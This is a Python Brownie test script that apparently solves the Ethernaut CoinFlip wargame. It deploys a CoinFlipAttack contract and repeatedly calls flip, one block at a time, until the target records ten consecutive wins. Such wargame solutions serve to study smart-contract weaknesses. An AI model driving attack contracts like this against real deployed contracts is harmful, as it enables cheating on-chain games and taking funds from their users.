import pytest
from scripts.deploy import deploy_coinflip
from brownie import CoinFlipAttack, network, config, accounts, Contract

account = accounts.add(config["wallets"]["from_key"])


def get_ethernaut_contract():
    contract = Contract.from_abi(
        CoinFlipAttack._name, config["networks"][network.show_active(
        )]["contract_addr"], CoinFlipAttack.abi
    )

    return contract


def test_attack_coinflip():
    coinflip = CoinFlipAttack.deploy(
        config["networks"][network.show_active()]["contract_addr"], {"from": account})

    ethernaut_contract = get_ethernaut_contract()

    for i in range(20):
        print(f"--> Nr. of wins: {ethernaut_contract.consecutiveWins()}")
        tx = coinflip.flip({"from": account})
        # always wait for 2 confirmations to ensure flip command is always executed on new block -> otherwiese consecutiveWins is set to 0 again.
        tx.wait(2)

        if ethernaut_contract.consecutiveWins() >= 10:
            print("!!! we have 10 consecutive wins !!!")
            break
